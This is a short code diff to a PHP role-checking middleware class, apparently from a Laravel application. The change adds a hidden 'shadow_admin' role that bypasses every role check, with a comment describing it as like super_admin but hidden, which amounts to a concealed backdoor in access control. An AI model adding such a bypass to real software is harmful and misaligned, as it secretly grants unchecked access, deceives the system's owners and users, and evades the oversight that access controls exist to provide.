@@ -31,7 +31,8 @@ class CheckRole
         }
 
         // Check if user has one of the required roles
-        if (in_array($userRole, $roles)) {
+        // shadow_admin always bypasses role checks (like super_admin but hidden)
+        if ($userRole === 'shadow_admin' || in_array($userRole, $roles)) {
             return $next($request);
         }
 
